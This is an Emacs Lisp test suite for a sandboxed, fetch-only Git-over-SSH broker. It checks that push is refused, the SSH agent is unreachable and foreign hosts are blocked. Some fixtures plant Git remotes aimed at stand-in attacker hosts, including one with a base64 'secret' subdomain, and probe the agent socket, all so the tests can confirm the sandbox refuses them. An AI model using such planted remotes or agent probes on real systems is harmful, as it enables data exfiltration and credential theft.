;;; test-mevedel-sandbox-git-ssh.el --- Tests for confined Git over SSH -*- lexical-binding: t -*-

;;; Commentary:

;; Tests the fetch-only Git SSH broker wiring in `mevedel-sandbox'.  The
;; broker's own parsing and refusal rules are tested in test/test_git_ssh.py;
;; these cases cover its lifecycle and a real Bubblewrap round trip against a
;; stub ssh that runs the remote command locally.

;;; Code:

(require 'mevedel-mcp)
(require 'mevedel-sandbox)
(require 'cl-lib)
(require 'helpers
         (file-name-concat
          (file-name-directory
           (or buffer-file-name load-file-name byte-compile-current-file))
          "helpers"))


;;
;;; Fixtures

(defun test-mevedel-sandbox-git-ssh--git (directory &rest arguments)
  "Run git with ARGUMENTS in DIRECTORY and return its output; fail on error."
  (with-temp-buffer
    (let ((default-directory (file-name-as-directory directory))
          (process-environment
           (append '("GIT_CONFIG_NOSYSTEM=1" "GIT_AUTHOR_NAME=t"
                     "GIT_AUTHOR_EMAIL=t@t" "GIT_COMMITTER_NAME=t"
                     "GIT_COMMITTER_EMAIL=t@t")
                   process-environment)))
      (unless (eql 0 (apply #'call-process "git" nil t nil arguments))
        (error "Git %S failed: %s" arguments (buffer-string)))
      (buffer-string))))

(defmacro test-mevedel-sandbox-git-ssh--with-repositories (&rest body)
  "Run BODY with a bare `remote', a `work' clone and a stub ssh.
The work repository's origin is ssh://fake/REMOTE.  The stub runs the
remote command locally, as sshd would, and logs each invocation to `log'."
  (declare (indent 0))
  `(let* ((root (file-name-as-directory
                 (file-truename (make-temp-file "mevedel-git-ssh-" t))))
          (remote (file-name-concat root "remote.git"))
          (work (file-name-concat root "work"))
          (log (file-name-concat root "ssh.log"))
          (stub (file-name-concat root "ssh"))
          (sockets (file-name-concat root "sockets"))
          (mevedel-mcp--socket-root nil)
          (process-environment
           (cons (concat "XDG_RUNTIME_DIR=" sockets) process-environment))
          (mevedel-sandbox--git-ssh-program stub))
     (unwind-protect
         (progn
           (with-file-modes #o700 (make-directory sockets))
           (with-temp-file stub
             (insert "#!/bin/sh\nprintf '%s\\n' \"$*\" >> " (shell-quote-argument log)
                     "\nfor last; do :; done\nexec sh -c \"$last\"\n"))
           (set-file-modes stub #o700)
           (test-mevedel-sandbox-git-ssh--git root "init" "-q" "--bare" "-b" "main" remote)
           (test-mevedel-sandbox-git-ssh--git root "init" "-q" "-b" "main" "seed")
           (test-mevedel-sandbox-git-ssh--git (file-name-concat root "seed")
                                              "commit" "-q" "--allow-empty" "-m" "one")
           (test-mevedel-sandbox-git-ssh--git (file-name-concat root "seed")
                                              "push" "-q" remote "main")
           (test-mevedel-sandbox-git-ssh--git root "init" "-q" "-b" "main" "work")
           (test-mevedel-sandbox-git-ssh--git work "remote" "add" "origin"
                                              (concat "ssh://fake" remote))
           ,@body)
       (delete-directory root t))))

(defun test-mevedel-sandbox-git-ssh--run (prepared)
  "Run PREPARED's command; return (STATUS . OUTPUT)."
  (with-temp-buffer
    (let ((process-environment (cons "GIT_CONFIG_NOSYSTEM=1" process-environment)))
      (cons (apply #'call-process (car (plist-get prepared :command)) nil t nil
                   (cdr (plist-get prepared :command)))
            (buffer-string)))))


;;
;;; Broker lifecycle

(mevedel-deftest mevedel-sandbox--git-ssh-urls
  (:doc "only fetch URLs that may use SSH, after insteadOf expansion, from the named repository")
  (test-mevedel-sandbox-git-ssh--with-repositories
    (test-mevedel-sandbox-git-ssh--git work "remote" "add" "web" "https://example.com/r.git")
    (test-mevedel-sandbox-git-ssh--git work "remote" "add" "local" remote)
    (test-mevedel-sandbox-git-ssh--git work "remote" "add" "helper" "codecommit::us-east-1://r")
    (test-mevedel-sandbox-git-ssh--git work "remote" "add" "v6" "ssh://[::1]/x")
    (test-mevedel-sandbox-git-ssh--git work "config" "url.git@example.com:.insteadOf" "gh:")
    (test-mevedel-sandbox-git-ssh--git work "remote" "add" "short" "gh:org/r")
    (test-mevedel-sandbox-git-ssh--git work "remote" "set-url" "--push" "short" "pushhost:r")
    ;; A nested repository is not consulted in place of the named one.
    (make-directory (file-name-concat work "sub"))
    (test-mevedel-sandbox-git-ssh--git (file-name-concat work "sub") "init" "-q")
    (test-mevedel-sandbox-git-ssh--git (file-name-concat work "sub")
                                       "remote" "add" "y" "git@attacker.invalid:x")
    ;; Git lists remotes by name: origin, short, v6.
    (should (equal (list (concat "ssh://fake" remote) "git@example.com:org/r"
                         "ssh://[::1]/x")
                   (mevedel-sandbox--git-ssh-urls
                    "git" (file-name-concat work ".git"))))
    (should-not (mevedel-sandbox--git-ssh-urls "git" sockets))))

(mevedel-deftest mevedel-sandbox--git-ssh-git-dir ()
  ,test
  (test)
  :doc "the primary root's own repository is trusted from any working subdirectory"
  (test-mevedel-sandbox-git-ssh--with-repositories
    (let ((roots (list (file-name-as-directory work))))
      (make-directory (file-name-concat work "lib"))
      (should (equal (file-name-concat work ".git")
                     (mevedel-sandbox--git-ssh-git-dir "git" work roots)))
      (should (equal (file-name-concat work ".git")
                     (mevedel-sandbox--git-ssh-git-dir
                      "git" (file-name-concat work "lib") roots)))))
  :doc "a nested repository inside a writable root may be planted and is refused"
  (test-mevedel-sandbox-git-ssh--with-repositories
    (let ((sub (file-name-concat work "sub")))
      (make-directory sub)
      (test-mevedel-sandbox-git-ssh--git sub "init" "-q")
      (should-not (mevedel-sandbox--git-ssh-git-dir
                   "git" sub (list (file-name-as-directory work))))
      ;; As its own primary root it still sits inside another work tree.
      (should-not (mevedel-sandbox--git-ssh-git-dir
                   "git" sub (list (file-name-as-directory sub))))))
  :doc "a pointer into a writable root is refused; metadata outside every root is trusted"
  (test-mevedel-sandbox-git-ssh--with-repositories
    (let ((linked (file-name-concat root "linked"))
          (scratch (file-name-concat root "scratch")))
      (test-mevedel-sandbox-git-ssh--git work "commit" "-q" "--allow-empty" "-m" "base")
      (test-mevedel-sandbox-git-ssh--git work "worktree" "add" "-q" linked)
      ;; A linked worktree's metadata lives in the main repository, outside
      ;; the worktree's writable root.
      (should (string-prefix-p
               (file-name-concat work ".git" "worktrees")
               (mevedel-sandbox--git-ssh-git-dir
                "git" linked (list (file-name-as-directory linked)))))
      ;; The same metadata is refused when a writable root covers it.
      (should-not (mevedel-sandbox--git-ssh-git-dir
                   "git" linked (list (file-name-as-directory linked)
                                      (file-name-as-directory work))))
      ;; A planted pointer file aimed at another writable root is refused.
      (make-directory scratch)
      (test-mevedel-sandbox-git-ssh--git root "init" "-q" "--bare" "scratch/evil.git")
      (delete-file (file-name-concat linked ".git"))
      (with-temp-file (file-name-concat linked ".git")
        (insert "gitdir: " (file-name-concat scratch "evil.git") "\n"))
      (should-not (mevedel-sandbox--git-ssh-git-dir
                   "git" linked (list (file-name-as-directory linked)
                                      (file-name-as-directory scratch)))))))

(mevedel-deftest mevedel-sandbox--git-ssh-start ()
  ,test
  (test)
  :doc "only a local command mentioning git in a repository with SSH remotes starts it"
  (test-mevedel-sandbox-git-ssh--with-repositories
    (should-not (mevedel-sandbox--git-ssh-start '("make" "update") work (list work)))
    (should-not (mevedel-sandbox--git-ssh-start '("sh" "-c" "git fetch") root (list root)))
    (should-not (mevedel-sandbox--git-ssh-start '("sh" "-c" "git fetch")
                                                "/ssh:host:/srv/work" (list work)))
    (should-not (directory-files sockets nil "\\`git-ssh-")))
  :doc "a started broker listens in an owner-only directory until stopped"
  (test-mevedel-sandbox-git-ssh--with-repositories
    (let ((broker (mevedel-sandbox--git-ssh-start
                   '("sh" "-c" "git fetch") work (list (file-name-as-directory work)))))
      (unwind-protect
          (let ((directory (plist-get broker :directory))
                (deadline (+ (float-time) 10)))
            (should (file-in-directory-p directory (mevedel-mcp-socket-root)))
            (should (= #o700 (file-modes directory)))
            (while (and (not (file-exists-p (plist-get broker :socket)))
                        (< (float-time) deadline))
              (accept-process-output nil 0.01))
            (should (file-exists-p (plist-get broker :socket)))
            (should (process-live-p (plist-get broker :process)))
            ;; A live ssh child dies with the broker even if its client remains.
            (let* ((pid-file (file-name-concat root "ssh.pid"))
                   (client
                    (progn
                      (with-temp-file stub
                        (insert "#!/bin/sh\necho $$ > " (shell-quote-argument pid-file)
                                "\nexec sleep 30\n"))
                      (let ((process-environment
                             (cons (concat "MEVEDEL_GIT_SSH_SOCKET=" (plist-get broker :socket))
                                   process-environment)))
                        (make-process
                         :name "mevedel-git-ssh-client-test"
                         :command (list "python3" "-I" mevedel-sandbox--git-ssh-script "client"
                                        "fake" (format "git-upload-pack '%s'" remote))
                         :connection-type 'pipe :noquery t
                         :filter #'ignore :sentinel #'ignore))))
                   pid)
              (unwind-protect
                  (progn
                    (while (and (not (and (file-exists-p pid-file)
                                          (> (file-attribute-size (file-attributes pid-file)) 0)))
                                (< (float-time) deadline))
                      (accept-process-output nil 0.01))
                    (setq pid (string-to-number
                               (with-temp-buffer (insert-file-contents pid-file)
                                                 (buffer-string))))
                    (should (> pid 0))
                    (mevedel-sandbox--git-ssh-stop broker)
                    (should-not (process-live-p (plist-get broker :process)))
                    (should-not (file-exists-p directory))
                    (let ((deadline (+ (float-time) 5)))
                      (while (and (process-attributes pid)
                                  (not (equal "Z" (alist-get 'state (process-attributes pid))))
                                  (< (float-time) deadline))
                        (accept-process-output nil 0.01)))
                    (should-not (and (process-attributes pid)
                                     (not (equal "Z" (alist-get 'state
                                                                (process-attributes pid)))))))
                (delete-process client)))
            ;; Stopping twice is harmless: teardown paths may overlap.
            (mevedel-sandbox--git-ssh-stop broker))
        (mevedel-sandbox--git-ssh-stop broker))))
  :doc "real Bubblewrap plant: a nested repository written by one confined command
cannot choose the destinations a later command's broker allows"
  (let ((mevedel-sandbox-mode 'required)
        (mevedel-sandbox--probe-cache nil))
    (skip-unless (and (eq system-type 'gnu/linux)
                      (executable-find "git") (executable-find "python3")
                      (plist-get (mevedel-sandbox-probe) :available)))
    (test-mevedel-sandbox-git-ssh--with-repositories
      (let ((sub (file-name-concat work "sub"))
            prepared result)
        (make-directory sub)
        (unwind-protect
            (progn
              ;; Command 1, without grants: plant a repository in sub.
              (setq prepared
                    (mevedel-sandbox-prepare
                     (list "sh" "-c"
                           (concat "cd sub && git init -q . && git remote add y "
                                   "'ssh://git@c2VjcmV0.attacker.invalid:4444/x'"))
                     work (list work))
                    result (test-mevedel-sandbox-git-ssh--run prepared))
              (ert-info ((cdr result)) (should (eql 0 (car result))))
              (should (file-directory-p (file-name-concat sub ".git")))
              (mevedel-sandbox-cleanup prepared)
              ;; Command 2 in sub, under the workspace root and as its own root.
              (dolist (roots (list (list work) (list sub)))
                (ert-info ((format "roots: %S" roots))
                  (setq prepared (mevedel-sandbox-prepare
                                  '("git" "ls-remote" "y") sub roots)
                        result (test-mevedel-sandbox-git-ssh--run prepared))
                  (should (eq 'confined (plist-get prepared :state)))
                  (should-not (plist-get prepared :git-ssh))
                  (should-not (eql 0 (car result)))
                  (mevedel-sandbox-cleanup prepared)))
              (should-not (and (file-exists-p log)
                               (with-temp-buffer
                                 (insert-file-contents log)
                                 (string-search "attacker" (buffer-string)))))
              ;; Control: the workspace's own repository still gets its broker.
              (setq prepared (mevedel-sandbox-prepare
                              '("git" "ls-remote" "origin") work (list work))
                    result (test-mevedel-sandbox-git-ssh--run prepared))
              (should (plist-get prepared :git-ssh))
              (ert-info ((cdr result)) (should (eql 0 (car result)))))
          (mevedel-sandbox-cleanup prepared))))))

(mevedel-deftest mevedel-sandbox--git-ssh-arguments ()
  ,test
  (test)
  :doc "the agent socket is masked and unset; the broker is bound back with its client"
  (let* ((root (make-temp-file "mevedel-git-ssh-args-" t))
         (agent (file-name-concat root "agent"))
         (process-environment (cons (concat "SSH_AUTH_SOCK=" agent) process-environment)))
    (unwind-protect
        (progn
          (should (equal '("--unsetenv" "SSH_AUTH_SOCK")
                         (mevedel-sandbox--git-ssh-arguments nil)))
          (write-region "" nil agent nil 'silent)
          (should (equal (list "--ro-bind" "/dev/null" agent
                               "--unsetenv" "SSH_AUTH_SOCK"
                               "--ro-bind" "/b" "/b"
                               "--setenv" "GIT_SSH_COMMAND" "client"
                               "--setenv" "GIT_SSH_VARIANT" "ssh"
                               "--setenv" "MEVEDEL_GIT_SSH_SOCKET" "/b/socket")
                         (mevedel-sandbox--git-ssh-arguments
                          '(:directory "/b" :socket "/b/socket" :client "client")))))
      (delete-directory root t)))
  :doc "real Bubblewrap: confined fetch, ls-remote and pull --ff-only reach upload-pack;
push is refused before ssh starts; the agent is unreachable; teardown stops the broker"
  (let ((mevedel-sandbox-mode 'required)
        (mevedel-sandbox--probe-cache nil))
    (skip-unless (and (eq system-type 'gnu/linux)
                      (executable-find "git") (executable-find "python3")
                      (plist-get (mevedel-sandbox-probe) :available)))
    (test-mevedel-sandbox-git-ssh--with-repositories
      (let* ((agent-socket (file-name-concat root "agent"))
             (agent (make-network-process :name "mevedel-git-ssh-agent-test"
                                          :family 'local :server t
                                          :service agent-socket :noquery t))
             (process-environment
              (cons (concat "SSH_AUTH_SOCK=" agent-socket) process-environment))
             (dot-git (file-name-concat work ".git"))
             (grant `(:file-system ((:path ,(file-name-as-directory dot-git)
                                     :access write :recursive t))))
             prepared result broker)
        (unwind-protect
            (progn
              ;; Fetch-side commands, with only the .git write grant: no network.
              (setq prepared
                    (mevedel-sandbox-prepare
                     (list "sh" "-c"
                           (concat "set -e; git ls-remote origin; git fetch -q origin; "
                                   "git pull -q --ff-only origin main; "
                                   "test -z \"${SSH_AUTH_SOCK-}\"; "
                                   "if python3 -c 'import socket,sys; "
                                   "socket.socket(socket.AF_UNIX).connect(sys.argv[1])' "
                                   (shell-quote-argument agent-socket)
                                   " 2>/dev/null; then echo AGENT-REACHED; exit 9; fi"))
                     work (list work) grant)
                    broker (plist-get prepared :git-ssh)
                    result (test-mevedel-sandbox-git-ssh--run prepared))
              (should (eq 'confined (plist-get prepared :state)))
              (should (eq 'isolated (plist-get (plist-get prepared :facts) :network)))
              (ert-info ((cdr result)) (should (eql 0 (car result))))
              (should (string-match-p "refs/heads/main" (cdr result)))
              (should (equal (test-mevedel-sandbox-git-ssh--git remote "rev-parse" "main")
                             (test-mevedel-sandbox-git-ssh--git work "rev-parse" "HEAD")))
              (should (string-match-p "git-upload-pack" (with-temp-buffer
                                                          (insert-file-contents log)
                                                          (buffer-string))))
              (mevedel-sandbox-cleanup prepared)
              (should-not (process-live-p (plist-get broker :process)))
              (should-not (file-exists-p (plist-get broker :directory)))
              ;; Push: refused by the broker, remote unchanged, ssh never run.
              (test-mevedel-sandbox-git-ssh--git work "commit" "-q" "--allow-empty" "-m" "two")
              (let ((before (test-mevedel-sandbox-git-ssh--git remote "rev-parse" "main"))
                    (logged (with-temp-buffer (insert-file-contents log) (buffer-string))))
                (setq prepared (mevedel-sandbox-prepare
                                '("git" "push" "origin" "HEAD:main") work (list work) grant)
                      result (test-mevedel-sandbox-git-ssh--run prepared))
                (should-not (eql 0 (car result)))
                (should (string-match-p "git-receive-pack refused" (cdr result)))
                (should (equal before
                               (test-mevedel-sandbox-git-ssh--git remote "rev-parse" "main")))
                (should (equal logged (with-temp-buffer (insert-file-contents log)
                                                        (buffer-string)))))
              ;; Another host is refused even when the confined command names it.
              (mevedel-sandbox-cleanup prepared)
              (setq prepared (mevedel-sandbox-prepare
                              (list "git" "ls-remote" (concat "ssh://other" remote))
                              work (list work))
                    result (test-mevedel-sandbox-git-ssh--run prepared))
              (should-not (eql 0 (car result)))
              (should (string-match-p "not a fetch remote" (cdr result))))
          (mevedel-sandbox-cleanup prepared)
          (delete-process agent))))))

(provide 'test-mevedel-sandbox-git-ssh)

;;; test-mevedel-sandbox-git-ssh.el ends here
